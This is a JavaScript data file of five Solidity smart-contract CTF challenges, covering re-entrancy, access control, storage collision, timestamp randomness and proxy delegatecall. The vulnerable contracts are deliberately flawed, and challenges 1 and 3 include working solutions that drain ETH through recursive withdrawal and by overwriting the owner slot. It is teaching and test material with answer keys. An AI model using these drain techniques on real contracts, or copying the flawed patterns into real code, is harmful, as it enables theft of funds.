export const CHALLENGE_DETAILS = {
  1: {
    title: 'Re-Entrancy',
    tags: ['solidity', 'hard', 'security', 'ctf'],
    passed: 826,
    points: 300,
    scenario: 'Alice and Bob each has 1 ETH deposited into EthBank contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");
        balances[msg.sender] = 0;
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all ETH from EthBank. You are given 1 ETH when the function pwn is called.',
        completed: false,
      },
    ],
    hints: [
      'Inside pwn, deposit and then withdraw 1 ETH.',
      'receive will be called by EthBank so call withdraw again.',
      'Optionally send all ETH to attacker.',
    ],
    solution: `receive() external payable {
    if (address(bank).balance >= 1 ether) {
        bank.withdraw();
    }
}

function pwn() external payable {
    bank.deposit{value: 1 ether}();
    bank.withdraw();
    payable(msg.sender).transfer(address(this).balance);
}`,
  },
  2: {
    title: 'Access Control',
    tags: ['solidity', 'easy', 'security', 'ctf'],
    points: 100,
    scenario: 'Complete the AccessControl contract implementation. Implement role-based access control with ADMIN and USER roles.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract AccessControl {
    event GrantRole(bytes32 indexed role, address indexed account);
    event RevokeRole(bytes32 indexed role, address indexed account);

    mapping(bytes32 => mapping(address => bool)) public roles;

    bytes32 public constant ADMIN = keccak256(abi.encodePacked("ADMIN"));

    function _grantRole(bytes32 role, address account) internal {
        // Write code here
    }

    function grantRole(bytes32 role, address account) external {
        // Write code here
    }

    function revokeRole(bytes32 role, address account) external {
        // Write code here
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Define a new role named USER, use the keccak256 hash of the string "USER" as an identifier for this role.',
        completed: false,
      },
      {
        id: 2,
        description: 'Define modifier named onlyRole(bytes32 role) that checks msg.sender has role before executing the rest of the code.',
        completed: false,
      },
      {
        id: 3,
        description: 'Complete function _grantRole. This function will set role for account to true and then emit the event GrantRole.',
        completed: false,
      },
      {
        id: 4,
        description: 'Complete the external function grantRole. This function must restrict access only to msg.sender having the ADMIN role.',
        completed: false,
      },
      {
        id: 5,
        description: 'Complete the external function revokeRole that will revoke role from account. This function must restrict access only to msg.sender having the ADMIN role.',
        completed: false,
      },
      {
        id: 6,
        description: 'Emit the event RevokeRole.',
        completed: false,
      },
      {
        id: 7,
        description: 'Grant role ADMIN to msg.sender when this contract is deployed.',
        completed: false,
      },
    ],
    hints: [
      'constructor() {\n    _grantRole(ADMIN, msg.sender);\n}',
    ],
  },
  3: {
    title: 'Misaligned Storage',
    tags: ['solidity', 'medium', 'security', 'ctf'],
    points: 200,
    scenario: 'UpgradeableWallet is an upgradeable contract, executes code at WalletImplementation via delegatecall.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract UpgradeableWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool ok,) = implementation.delegatecall(msg.data);
        require(ok, "failed");
    }

    function setImplementation(address _implementation) external {
        require(msg.sender == owner, "not owner");
        implementation = _implementation;
    }
}

contract WalletImplementation {
    address public implementation;
    uint256 public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint256 _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all ETH from the wallet. The function pwn will be called to initiate the exploit.',
        completed: false,
      },
    ],
    hints: [
      'Update owner by calling setWithdrawLimit',
      'Set implementation to UpgradeableWalletExploit contract.',
      'Withdraw all ETH from the wallet by calling withdraw().',
      'Declare an receive() to receive ETH from UpgradeableWallet.',
    ],
    solution: `receive() external payable {}

function pwn() external {
    IUpgradeableWallet(target).setWithdrawLimit(
        uint256(uint160(address(this)))
    );
    IUpgradeableWallet(target).setImplementation(address(this));
    IUpgradeableWallet(target).withdraw();
}

function withdraw() external {
    payable(msg.sender).transfer(address(this).balance);
}`,
  },
  4: {
    title: 'Lottery Randomness',
    tags: ['solidity', 'medium', 'security', 'ctf'],
    points: 200,
    scenario: 'The lottery uses block.timestamp for randomness which can be manipulated.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge4_Lottery {
    function play() external payable {
        require(msg.value == 1 ether, "Must send 1 ETH");
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        if (random % 2 == 0) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Manipulate the randomness to always win the lottery.',
        completed: false,
      },
    ],
    hints: [
      'block.timestamp can be influenced by miners.',
      'You can predict the outcome if you know the timestamp.',
      'Create a contract that can calculate the winning condition.',
    ],
  },
  5: {
    title: 'Proxy Delegatecall',
    tags: ['solidity', 'hard', 'security', 'ctf'],
    points: 300,
    scenario: 'The proxy contract uses delegatecall which preserves the storage context.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge5_Proxy {
    address public implementation;
    address public owner;
    
    function upgrade(address _impl) external {
        require(msg.sender == owner, "Not owner");
        implementation = _impl;
    }
    
    fallback() external {
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Exploit the delegatecall to take ownership of the proxy.',
        completed: false,
      },
    ],
    hints: [
      'delegatecall preserves the storage layout of the calling contract.',
      'Storage slots must match between proxy and implementation.',
      'You can manipulate storage by calling functions through delegatecall.',
    ],
  },
}

